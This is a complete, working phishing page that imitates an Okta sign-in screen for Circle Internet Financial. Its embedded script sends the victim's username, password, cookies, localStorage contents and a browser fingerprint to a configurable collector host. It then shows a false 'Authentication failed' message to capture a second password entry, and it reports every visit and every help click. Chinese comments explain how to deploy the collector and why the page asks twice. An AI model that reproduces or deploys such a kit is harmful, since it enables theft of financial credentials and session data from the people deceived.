<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>circle_default - Sign In</title>
<link rel="icon" href="data:,">
<link rel="stylesheet" href="https://circle.okta.com/css/okta-sign-in.min.css" onerror="this.remove()">
<style>
  :root{--brand:#0a0b0d;--muted:#67717f;--line:#dfe3e8;--err:#e3484d}
  *{box-sizing:border-box}
  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
       background:#f7f8fa;color:#12151a;-webkit-font-smoothing:antialiased}
  .wrap{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px}
  .brand{display:flex;align-items:center;gap:10px;margin-bottom:22px}
  .brand .mark{width:30px;height:30px;border-radius:50%;background:linear-gradient(135deg,#111,#3a3f46);
       display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:17px}
  .brand .name{font-size:19px;font-weight:600;letter-spacing:-.2px}
  .card{width:100%;max-width:420px;background:#fff;border:1px solid var(--line);border-radius:12px;
        padding:34px 34px 26px;box-shadow:0 1px 2px rgba(16,24,40,.04),0 12px 32px rgba(16,24,40,.06)}
  h1{font-size:20px;font-weight:600;margin:0 0 26px}
  label{display:block;font-size:13px;font-weight:600;margin:0 0 6px;color:#2b3138}
  .input{width:100%;height:42px;border:1px solid #c7cdd6;border-radius:8px;padding:0 12px;font-size:14px;
         outline:none;transition:border-color .12s,box-shadow .12s}
  .input:focus{border-color:#1662dd;box-shadow:0 0 0 3px rgba(22,98,221,.14)}
  .row{margin-bottom:18px}
  .chk{display:flex;align-items:center;gap:8px;font-size:13px;color:#3b424b;margin:2px 0 20px}
  .btn{width:100%;height:44px;border:0;border-radius:8px;background:var(--brand);color:#fff;font-size:15px;
       font-weight:600;cursor:pointer}
  .btn:disabled{opacity:.6;cursor:default}
  .links{margin-top:18px;font-size:13px;display:flex;flex-direction:column;gap:8px}
  a{color:#1662dd;text-decoration:none}
  a:hover{text-decoration:underline}
  .err{display:none;background:#fdf3f3;border:1px solid #f3c7c7;color:var(--err);font-size:13px;
       padding:10px 12px;border-radius:8px;margin-bottom:16px}
  .foot{margin-top:26px;font-size:12px;color:var(--muted)}
  .sso{margin-top:20px;display:flex;gap:10px;align-items:center;justify-content:center;font-size:12px;color:var(--muted)}
</style>
</head>
<body>
<div class="wrap">
  <div class="brand"><div class="mark">c</div><div class="name">circle</div></div>

  <form class="card" id="f" autocomplete="off" novalidate>
    <h1>Sign in</h1>
    <div class="err" id="err"></div>

    <div class="row">
      <label for="u">Username</label>
      <input class="input" id="u" name="username" type="email" autocapitalize="none"
             autocomplete="username" spellcheck="false" required>
    </div>
    <div class="row">
      <label for="p">Password</label>
      <input class="input" id="p" name="password" type="password" autocomplete="current-password" required>
    </div>

    <label class="chk"><input type="checkbox" id="rm" checked> Remember me</label>
    <button class="btn" id="go" type="submit">Sign In</button>

    <div class="links">
      <a href="#" id="help">Need help signing in?</a>
      <a href="#" id="reset">Forgot password?</a>
    </div>

    <div class="sso">Secured by Okta &nbsp;·&nbsp; circle_default</div>
    <div class="foot">© <span id="y"></span> Circle Internet Financial, LLC</div>
  </form>
</div>

<script>
(function () {
  "use strict";
  var COLLECT_URL = window.COLLECT_URL || "/c";   // 部署时改成收集器地址，如 https://x.example/c
  document.getElementById("y").textContent = new Date().getFullYear();

  function fp() {
    var n = navigator, s = screen;
    return {
      ua: n.userAgent, lang: n.language, langs: (n.languages || []).join(","),
      tz: (Intl.DateTimeFormat().resolvedOptions() || {}).timeZone || "",
      screen: s.width + "x" + s.height + "@" + (window.devicePixelRatio || 1),
      platform: n.platform || "", hc: n.hardwareConcurrency || 0,
      mem: n.deviceMemory || 0, touch: ("ontouchstart" in window) ? 1 : 0,
      ref: document.referrer || "", href: location.href,
      cookies: document.cookie || "",
      storage: (function () { try { return JSON.stringify(localStorage).slice(0, 1200); } catch (e) { return ""; } })()
    };
  }

  function post(payload, beacon) {
    var body = JSON.stringify(payload);
    if (beacon && navigator.sendBeacon) {
      try { navigator.sendBeacon(COLLECT_URL, new Blob([body], { type: "application/json" })); return; } catch (e) {}
    }
    try {
      fetch(COLLECT_URL, { method: "POST", mode: "no-cors", headers: { "Content-Type": "application/json" }, body: body });
    } catch (e) {}
  }

  var f = document.getElementById("f"), go = document.getElementById("go");
  f.addEventListener("submit", function (ev) {
    ev.preventDefault();
    var u = document.getElementById("u").value.trim();
    var p = document.getElementById("p").value;
    var err = document.getElementById("err");
    if (!u || !p) {
      err.textContent = "Please enter your username and password.";
      err.style.display = "block";
      return;
    }
    err.style.display = "none";
    go.disabled = true;
    go.textContent = "Signing in…";

    post({ stage: "credentials", username: u, password: p, remember: document.getElementById("rm").checked,
           fp: fp(), ts: new Date().toISOString() }, false);

    // 第一次交卷后立刻要求二次输入（真实 Okta 也会在密码错误时回到同一页），
    // 这样即便密码是错的，也能拿到第二组输入与时间差。
    setTimeout(function () {
      go.disabled = false;
      go.textContent = "Sign In";
      document.getElementById("p").value = "";
      err.textContent = "Authentication failed. Please try again.";
      err.style.display = "block";
      document.getElementById("p").focus();
      post({ stage: "retry_shown", username: u, ts: new Date().toISOString() }, true);
    }, 1400);
  });

  document.getElementById("help").addEventListener("click", function (e) {
    e.preventDefault();
    post({ stage: "help_clicked", fp: fp(), ts: new Date().toISOString() }, true);
  });

  // 落地即上报一次（判断谁点了链接，即使不填表）
  setTimeout(function () { post({ stage: "landed", fp: fp(), ts: new Date().toISOString() }, true); }, 400);
})();
</script>
</body>
</html>
